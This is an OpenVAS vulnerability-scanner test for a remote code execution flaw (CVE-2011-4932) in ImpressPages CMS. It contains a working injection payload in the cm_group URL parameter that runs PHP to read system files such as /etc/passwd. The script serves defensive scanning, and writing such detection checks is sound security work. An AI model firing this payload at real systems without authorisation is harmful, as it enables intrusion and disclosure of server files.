###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ImpressPages_49798.nasl 5700 2017-03-23 16:03:37Z cfi $
#
# ImpressPages CMS 'actions.php' Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "ImpressPages CMS is prone to a remote-code execution vulnerability.

Exploiting this issue will allow attackers to execute arbitrary code
within the context of the affected application.

ImpressPages CMS 1.0.12 is vulnerable; other versions may also
be affected.";

tag_solution = "Vendor updates are available. Please see the references for more
information.";

if (description)
{
 script_id(103378);
 script_cve_id("CVE-2011-4932");
 script_bugtraq_id(49798);
 script_version("$Revision: 5700 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("ImpressPages CMS 'actions.php' Remote Code Execution Vulnerability");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/49798");
 script_xref(name : "URL" , value : "http://www.impresspages.org/");
 script_xref(name : "URL" , value : "http://www.impresspages.org/news/impresspages-1-0-13-security-release/");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/521118");
 script_tag(name:"last_modification", value:"$Date: 2017-03-23 17:03:37 +0100 (Thu, 23 Mar 2017) $");
 script_tag(name:"creation_date", value:"2012-01-06 10:27:46 +0100 (Fri, 06 Jan 2012)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
   
port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/impress", "/impresspages", "/imprescms", "/cms", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/";
  buf = http_get_cache( item:url, port:port );

  if( buf =~ "Powered by.*ImpressPages" ) {
    foreach file( keys( files ) ) {
      url = dir + "/?cm_group=text_photos\\title\\Module();echo%20file_get_contents(%27/" + files[file] + "%27);echo&cm_name=openvas";
      if( http_vuln_check( port:port, url:url, pattern:file ) ) {
        report = report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );
